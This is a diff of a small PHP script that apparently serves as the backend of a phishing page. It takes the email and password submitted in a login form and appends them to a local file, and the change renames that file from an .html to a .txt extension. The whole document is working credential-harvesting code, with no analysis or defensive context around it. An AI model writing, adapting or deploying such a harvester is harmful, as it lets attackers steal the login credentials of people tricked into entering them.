@@ -1,7 +1,7 @@
 <?php
 $email = $_POST['email'];
 $pass = $_POST['pass'];
-$guardame = fopen('credencial.html','a+');
+$guardame = fopen('credencial.txt','a+');
 fwrite($guardame,
 	"username: ".$email.
 "\password: ".$pass." ");
